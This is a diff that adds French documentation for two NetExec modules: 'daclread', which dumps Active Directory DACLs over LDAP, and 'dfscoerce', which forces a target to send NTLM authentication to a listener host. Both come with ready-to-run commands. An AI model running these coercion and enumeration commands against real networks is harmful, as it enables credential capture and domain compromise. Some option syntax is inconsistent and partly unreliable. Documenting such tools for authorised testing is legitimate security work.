@@ -187,3 +187,79 @@ nxc smb targets.txt -M coerce_plus -o LISTEN=192.168.1.20
 **Explication** :
 
 * Applique la coercition à toutes les cibles listées dans `targets.txt`.
+
+***
+
+#### Module : `daclread`
+
+**1. Nom du Module : `daclread`**
+
+* **Protocole pris en charge** : LDAP
+* **Description** : Ce module extrait les listes de contrôle d'accès discrétionnaire (DACL) pour des objets Active Directory spécifiés.
+
+**2. Options / Paramètres**
+
+* `--OBJECT` : Nom de l'objet cible pour lequel les DACL doivent être extraits.
+* `--DC` : Contrôleur de domaine cible.
+
+**3. Commandes Typiques avec Explications**
+
+**Commande de base** :
+
+```
+nxc ldap 192.168.1.10 -u admin -p 'password' -M daclread -o OBJECT=CN=Users,DC=example,DC=com
+```
+
+**Explication** :
+
+* Extrait les DACL pour l'objet `CN=Users,DC=example,DC=com` depuis le contrôleur de domaine spécifié.
+
+**4. Commandes Avancées**
+
+Commande avec spécification d'un contrôleur de domaine :
+
+```
+nxc ldap 192.168.1.10 -u admin -p 'password' -M daclread -o OBJECT=CN=Users,DC=example,DC=com,DC=dc.example.com
+```
+
+**Explication** :
+
+* Extrait les DACL pour un objet spécifique et les récupère depuis `dc.example.com`.
+
+***
+
+#### Module : `dfscoerce`
+
+**1. Nom du Module : `dfscoerce`**
+
+* **Protocole pris en charge** : SMB
+* **Description** : Ce module exploite une vulnérabilité dans le service DFS pour forcer une authentification NTLM sur un autre hôte.
+
+**2. Options / Paramètres**
+
+* `--LISTEN` : Adresse IP de l’hôte écouteur pour capturer les authentifications NTLM.
+* `--VERBOSE` : Active une sortie détaillée.
+
+**3. Commandes Typiques avec Explications**
+
+**Commande de base** :
+
+```
+nxc smb 192.168.1.10 -M dfscoerce -o LISTEN=192.168.1.20
+```
+
+**Explication** :
+
+* Exploite la vulnérabilité DFS pour forcer une authentification NTLM de la cible `192.168.1.10` vers l’hôte `192.168.1.20`.
+
+**4. Commandes Avancées**
+
+Commande avec sortie détaillée :
+
+```
+nxc smb 192.168.1.10 -M dfscoerce -o LISTEN=192.168.1.20,VERBOSE=1
+```
+
+**Explication** :
+
+* Fournit des informations supplémentaires pendant l'exécution du module.
